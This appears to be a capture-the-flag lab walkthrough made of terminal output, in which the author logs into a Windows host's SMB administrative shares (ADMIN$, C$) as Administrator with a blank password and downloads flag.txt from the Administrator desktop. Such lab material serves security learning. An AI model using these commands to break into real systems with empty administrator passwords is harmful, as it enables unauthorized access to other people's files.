```
# Password unknown, just pressed Enter when prompted

┌──(kali㉿kali)-[~]
└─$ smbclient -L //10.129.91.210 -U Administrator                           
Password for [WORKGROUP\Administrator]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

┌──(kali㉿kali)-[~]
└─$ smbclient //10.129.91.210/ADMIN$ -U Administrator
Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \> 

# Lots of files, but not seeing a flag
```

```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.129.91.210/C$ -U Administrator
Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Wed Apr 21 09:23:49 2021
  Config.Msi                        DHS        0  Wed Jul  7 12:04:56 2021
  Documents and Settings          DHSrn        0  Wed Apr 21 09:17:12 2021
  pagefile.sys                      AHS 738197504  Sat Aug 16 09:19:55 2025
  PerfLogs                            D        0  Sat Sep 15 01:19:00 2018
  Program Files                      DR        0  Wed Jul  7 12:04:24 2021
  Program Files (x86)                 D        0  Wed Jul  7 12:03:38 2021
  ProgramData                        DH        0  Tue Sep 13 10:27:53 2022
  Recovery                         DHSn        0  Wed Apr 21 09:17:15 2021
  System Volume Information         DHS        0  Wed Apr 21 09:34:04 2021
  Users                              DR        0  Wed Apr 21 09:23:18 2021
  Windows                             D        0  Wed Jul  7 12:05:23 2021

                3774463 blocks of size 4096. 1156879 blocks available
smb: \> cd Users
smb: \Users\> ls
  .                                  DR        0  Wed Apr 21 09:23:18 2021
  ..                                 DR        0  Wed Apr 21 09:23:18 2021
  Administrator                       D        0  Wed Apr 21 09:23:32 2021
  All Users                       DHSrn        0  Sat Sep 15 01:28:48 2018
  Default                           DHR        0  Wed Apr 21 09:17:12 2021
  Default User                    DHSrn        0  Sat Sep 15 01:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 01:16:48 2018
  Public                             DR        0  Wed Apr 21 09:23:31 2021

                3774463 blocks of size 4096. 1156441 blocks available
smb: \Users\> cd Administrator\
smb: \Users\Administrator\> ls
  .                                   D        0  Wed Apr 21 09:23:32 2021
  ..                                  D        0  Wed Apr 21 09:23:32 2021
  3D Objects                         DR        0  Wed Apr 21 09:23:31 2021
  AppData                            DH        0  Wed Apr 21 09:23:19 2021
  Application Data                DHSrn        0  Wed Apr 21 09:23:19 2021
  Contacts                           DR        0  Wed Apr 21 09:23:31 2021
  Cookies                         DHSrn        0  Wed Apr 21 09:23:19 2021
  Desktop                            DR        0  Thu Apr 22 01:16:03 2021
  Documents                          DR        0  Wed Apr 21 09:23:32 2021
  Downloads                          DR        0  Wed Jul  7 11:44:36 2021
  Favorites                          DR        0  Wed Apr 21 09:23:31 2021
  Links                              DR        0  Wed Apr 21 09:23:32 2021
  Local Settings                  DHSrn        0  Wed Apr 21 09:23:19 2021
  Music                              DR        0  Wed Apr 21 09:23:32 2021
  My Documents                    DHSrn        0  Wed Apr 21 09:23:19 2021
  NetHood                         DHSrn        0  Wed Apr 21 09:23:19 2021
  NTUSER.DAT                        AHn   786432  Tue Sep 13 10:29:05 2022
  ntuser.dat.LOG1                   AHS   274432  Wed Apr 21 09:23:18 2021
  ntuser.dat.LOG2                   AHS   229376  Wed Apr 21 09:23:18 2021
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf    AHS    65536  Wed Apr 21 03:03:39 2021
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Wed Apr 21 09:23:19 2021
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Wed Apr 21 09:23:19 2021
  ntuser.ini                         HS       20  Wed Apr 21 09:23:19 2021
  Pictures                           DR        0  Wed Apr 21 09:23:31 2021
  PrintHood                       DHSrn        0  Wed Apr 21 09:23:19 2021
  Recent                          DHSrn        0  Wed Apr 21 09:23:19 2021
  Saved Games                        DR        0  Wed Apr 21 09:23:32 2021
  Searches                           DR        0  Wed Apr 21 09:23:32 2021
  SendTo                          DHSrn        0  Wed Apr 21 09:23:19 2021
  Start Menu                      DHSrn        0  Wed Apr 21 09:23:19 2021
  Templates                       DHSrn        0  Wed Apr 21 09:23:19 2021
  Videos                             DR        0  Wed Apr 21 09:23:31 2021

                3774463 blocks of size 4096. 1156441 blocks available
smb: \Users\Administrator\> cd Desktop\
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Thu Apr 22 01:16:03 2021
  ..                                 DR        0  Thu Apr 22 01:16:03 2021
  desktop.ini                       AHS      282  Wed Apr 21 09:23:32 2021
  flag.txt                            A       32  Fri Apr 23 03:39:00 2021

                3774463 blocks of size 4096. 1156441 blocks available
smb: \Users\Administrator\Desktop\> get flag.txt 
getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \Users\Administrator\Desktop\> 

```